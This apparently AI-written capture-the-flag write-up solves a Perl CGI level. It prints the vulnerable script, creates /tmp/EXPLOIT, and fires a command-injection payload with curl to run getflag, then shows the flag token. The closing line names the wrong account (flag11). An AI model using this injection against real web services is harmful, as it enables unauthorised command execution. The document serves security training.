Here is the **Level12 Solution Write-up** based on your exploit steps:

### Solution

1. **Check files in home directory.**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
	```

	This is a **SUID Perl script** that runs as `flag12`.

2. **Analyze the script source code:**

	```perl
	#!/usr/bin/env perl
	use CGI qw{param};
	print "Content-type: text/html\n\n";

	sub t {
		$nn = $_[1];
		$xx = $_[0];
		$xx =~ tr/a-z/A-Z/;        # convert to uppercase
		$xx =~ s/\s.*//;           # strip after first space
		@output = `egrep "^$xx" /tmp/xd 2>&1`;  # run egrep with unsanitized input
		foreach $line (@output) {
			($f, $s) = split(/:/, $line);
			if($s =~ $nn) {
				return 1;
			}
		}
		return 0;
	}

	sub n {
		if($_[0] == 1) {
			print("..");
		} else {
			print(".");
		}
	}

	n(t(param("x"), param("y")));
	```

	The input `param("x")` is used inside backticks:

	```perl
	@output = `egrep "^$xx" /tmp/xd 2>&1`;
	```

	This leads to **command injection**, since Perl's backticks execute shell commands.

3. **Create a malicious command:**

	```bash
	echo 'getflag>/tmp/flag12' > /tmp/EXPLOIT
	chmod +x /tmp/EXPLOIT
	```

4. **Trigger the exploit via `curl`:**

	```bash
	curl "http://localhost:4646/level12.pl?x=\`/*/EXPLOIT\`"
	```

	This injects `` `/tmp/EXPLOIT` `` into the command.

	* Why this works:

		* Perl executes:

			```bash
			`egrep "^`/*/EXPLOIT`" /tmp/xd`
			```
		* Which becomes:

			```bash
			`egrep "^<output of /tmp/EXPLOIT>" /tmp/xd`
			```
		* But `/tmp/EXPLOIT` contains `getflag>/tmp/flag12`, so the command is executed before `egrep`.

	View the Flag

	```bash
	cat /tmp/flag12
	```

	Output:

	```
	Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
	```

	You’ve successfully executed `getflag` with `flag11`’s privileges.
